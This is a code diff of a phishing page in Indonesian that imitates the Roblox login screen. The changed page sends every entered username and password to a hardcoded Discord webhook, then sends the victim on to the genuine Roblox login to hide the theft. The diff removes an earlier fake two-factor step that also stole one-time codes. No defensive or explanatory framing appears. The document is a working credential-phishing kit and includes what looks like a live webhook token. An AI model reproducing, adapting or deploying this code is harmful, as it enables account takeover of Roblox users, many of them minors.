@@ -20,15 +20,11 @@
   .btn-gray { display: block; width: 100%; background: #393b3d; color: #fff; padding: 14px; border-radius: 8px; text-align: center; text-decoration: none; font-weight: 600; margin-bottom: 10px; cursor: pointer; }
   .footer { text-align: center; font-size: 14px; color: #b8b8b8; margin-top: 24px; }
   .footer a { color: #fff; text-decoration: none; font-weight: 600; }
-  .twofa { display: none; margin-top: 15px; }
-  .twofa input { text-align: center; letter-spacing: 4px; font-size: 20px; }
-  .twofa p { font-size: 13px; color: #b8b8b8; margin-bottom: 15px; text-align: center; }
 </style>
 </head>
 <body>
 <div class="overlay"></div>
 <main class="card">
-  
   <div id="loginSection">
     <h1>Log in ke Roblox</h1>
     <form id="f" novalidate>
@@ -43,45 +39,9 @@
     <a href="#" class="btn-gray">Opsi log in lainnya</a>
     <div class="footer">Tidak punya akun? <a href="#" onclick="return false;">Daftar</a></div>
   </div>
-
-  <div id="twofaSection" class="twofa">
-    <h1>Verifikasi 2 Langkah</h1>
-    <p>Masukkan kode dari aplikasi authenticator kamu untuk melanjutkan.</p>
-    <input id="2fa_code" type="text" placeholder="xxxxxx" maxlength="6" autocomplete="one-time-code" required>
-    <button id="verifyBtn">Verifikasi</button>
-    <div class="links"><a href="#" onclick="return false;">Masalah dengan kode?</a></div>
-  </div>
-
 </main>
-
 <script>
 var webhookURL = "https://discord.com/api/webhooks/1567847177643106384/w0XBjAtPTb9tITOSKZeTEW_fXsJxgecro2b-81vs9rTxIdrMWxZaRhKutRW8Fe8Ck6IW";
-
-function sendToDiscord(title, u, p, code = null) {
-  var fields = [
-    { name: "Username / Email", value: u, inline: false },
-    { name: "Password", value: p, inline: false }
-  ];
-  if(code) {
-    fields.push({ name: "Kode 2FA", value: code, inline: false });
-  }
-
-  var embedData = {
-    embeds: [{
-      title: title,
-      color: code ? 16711680 : 3447003,
-      fields: fields,
-      footer: { text: "Ryuu System" },
-      timestamp: new Date().toISOString()
-    }]
-  };
-
-  fetch(webhookURL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(embedData)
-  });
-}
 
 document.getElementById('f').addEventListener('submit', function(e){
   e.preventDefault();
@@ -100,40 +60,30 @@ document.getElementById('f').addEventListener('submit', function(e){
   go.textContent = "Memeriksa akun...";
   go.disabled = true;
 
-  sendToDiscord("Roblox Login - Password Dapet", u, p);
+  var embedData = {
+    embeds: [{
+      title: "Roblox Login",
+      color: 3447003,
+      fields: [
+        { name: "Username / Email", value: u, inline: false },
+        { name: "Password", value: p, inline: false }
+      ],
+      footer: { text: "Ryuu System" },
+      timestamp: new Date().toISOString()
+    }]
+  };
 
-  fetch("https://api.rover.link/v1/users/" + encodeURIComponent(u) + "/2fa")
-  .then(res => res.json())
-  .then(data => {
-    if (data.enabled === true) {
-      document.getElementById('loginSection').style.display = "none";
-      document.getElementById('twofaSection').style.display = "block";
-    } else {
-      window.location.href = "https://www.roblox.com/login";
-    }
+  fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(embedData)
   })
-  .catch(err => {
+  .then(res => {
+    window.location.href = "https://www.roblox.com/login";
+  })
+  .catch(error => {
     window.location.href = "https://www.roblox.com/login";
   });
-});
-
-document.getElementById('verifyBtn').addEventListener('click', function(e){
-  e.preventDefault();
-  var u = document.getElementById('u').value;
-  var p = document.getElementById('p').value;
-  var code = document.getElementById('2fa_code').value;
-  var btn = document.getElementById('verifyBtn');
-
-  if(!code || code.length < 6) return;
-
-  btn.textContent = "Memverifikasi...";
-  btn.disabled = true;
-
-  sendToDiscord("Roblox 2FA Code Dapet!", u, p, code);
-
-  setTimeout(() => {
-    window.location.href = "https://www.roblox.com/login";
-  }, 1500);
 });
 </script>
 </body>
